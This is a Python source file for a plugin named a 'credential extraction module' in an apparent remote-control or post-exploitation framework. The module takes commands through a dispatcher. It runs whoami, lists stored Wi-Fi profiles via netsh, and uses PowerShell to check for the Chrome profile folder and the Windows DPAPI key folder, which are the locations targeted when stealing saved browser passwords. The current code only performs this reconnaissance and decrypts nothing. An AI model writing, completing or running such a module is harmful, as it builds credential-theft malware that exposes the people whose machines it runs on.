"""凭证提取模块 - credentials"""

from modules.api import ModuleBase


class CredentialsModule(ModuleBase):
    @property
    def name(self):
        return "credentials"

    @property
    def description(self):
        return "凭证提取模块"

    @property
    def author(self):
        return "帅丘"

    @property
    def version(self):
        return "2.0.0"

    def handle(self, cmd):
        t = cmd.get("type")
        p = cmd.get("payload")
        action = p.get("action") if p else None
        if action:
            if action == "check":
                return self._creds_check()
            elif action == "wifi":
                return self._creds_wifi()
            elif action == "browsers":
                return self._creds_browsers()
            elif action == "dpapi":
                return self._creds_dpapi()
        return {"status": "error", "result": "Unknown", "result_type": "error"}

    def get_commands(self):
        return ["creds"]

    def _creds_check(self):
        result = __import__('subprocess').run(['whoami'], capture_output=True, text=True, timeout=5)
        return {"status": "ok", "result": result.stdout.strip(), "result_type": "ok"}

    def _creds_wifi(self):
        result = __import__('subprocess').run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, timeout=10)
        return {"status": "ok", "result": result.stdout, "result_type": "creds_wifi"}

    def _creds_browsers(self):
        import sys
        if not sys.platform.startswith('win'):
            return {"status": "error", "result": "Windows only", "result_type": "error"}
        ps = "if (Test-Path \"${env:LocalAppData}\\Chrome\") { Write-Output \"Exists\" }"
        result = __import__('subprocess').run(['powershell', '-Command', ps], capture_output=True, text=True, timeout=10)
        return {"status": "ok", "result": result.stdout, "result_type": "creds_browsers"}

    def _creds_dpapi(self):
        import sys
        if not sys.platform.startswith('win'):
            return {"status": "error", "result": "Windows only", "result_type": "error"}
        ps = "if (Test-Path \"${env:AppData}\\Microsoft\\Protect\") { Write-Output \"Exists\" }"
        result = __import__('subprocess').run(['powershell', '-Command', ps], capture_output=True, text=True, timeout=10)
        return {"status": "ok", "result": result.stdout, "result_type": "creds_dpapi"}


module = CredentialsModule()
